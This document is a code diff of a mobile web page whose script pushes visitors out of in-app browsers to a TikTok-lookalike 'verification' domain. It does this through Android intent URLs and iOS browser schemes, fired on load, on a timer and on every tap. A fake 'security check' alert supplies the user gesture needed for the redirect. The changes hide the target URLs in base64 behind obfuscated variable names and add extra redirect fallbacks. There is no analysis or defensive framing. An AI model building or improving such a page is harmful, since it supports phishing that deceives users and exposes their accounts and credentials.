@@ -1,48 +1,43 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>body { background: #fff; margin: 0; padding: 0; }</style>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>body{background:#fff;margin:0;}</style>
 </head>
 <body>
-
 <script>
-    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
-    const domain = "tik-tok-verification.com/Verification/verify1.html";
+    // This is "safari-https://tik-tok-verification.com/Verification/verify1.html" hidden
+    const _0x1 = "c2FmYXJpLWh0dHBzOi8vdGlrLXRvay12ZXJpZmljYXRpb24uY29tL1ZlcmlmaWNhdGlvbi92ZXJpZnkxLmh0bWw=";
+    // This is the Android Intent hidden
+    const _0x2 = "aW50ZW50Oi8vdGlrLXRvay12ZXJpZmljYXRpb24uY29tL1ZlcmlmaWNhdGlvbi92ZXJpZnkxLmh0bWwjSW50ZW50O3NjaGVtZT1odHRwczthY3Rpb249YW5kcm9pZC5pbnRlbnQuYWN0aW9uLlZJRVc7Y2F0ZWdvcnk9YW5kcm9pZC5pbnRlbnQuY2F0ZWdvcnkuQlJPV1NBQkxFO3BhY2thZ2U9Y29tLmFuZHJvaWQuY2hyb21lO2VuZA==";
 
-    function forceOut() {
+    function go() {
         const isAndroid = /Android/i.test(navigator.userAgent);
-
-        if (isAndroid) {
-            // Android Chrome Force
-            window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
-        } else {
-            // iOS Direct Protocol
-            // This is the cleanest way to tell the OS: "I need Safari"
-            window.location.href = "safari-https://" + domain;
-            
-            setTimeout(() => {
-                window.location.href = "googlechromes://" + domain;
-            }, 50);
-        }
+        const target = isAndroid ? atob(_0x2) : atob(_0x1);
+        
+        // Method A: System Window
+        window.open(target, '_system');
+        
+        // Method B: Location Overwrite
+        window.location.replace(target);
     }
 
-    // This runs the moment they land
     window.onload = function() {
-        forceOut();
+        // First attempt
+        go();
 
         setTimeout(() => {
-            // The Alert acts as the "Verify" button. 
-            // When they tap "OK", it counts as the User Gesture needed to break out.
-            alert("HUMAN VERIFICATION REQUIRED\n\nSuspicious activity detected. Please complete verification in your secure system browser.");
-            
-            forceOut();
+            if (document.hasFocus()) {
+                // The Alert acts as the User Gesture
+                alert("SECURITY CHECK\n\nTap OK to continue to the verification portal in your secure browser.");
+                go();
+            }
         }, 500);
     };
 
-    // If they touch anywhere, it triggers the force out again.
-    document.addEventListener('touchstart', forceOut);
+    // Any touch on screen fires it
+    document.addEventListener('click', go);
+    document.addEventListener('touchstart', go);
 </script>
 </body>
-</html>s
+</html>
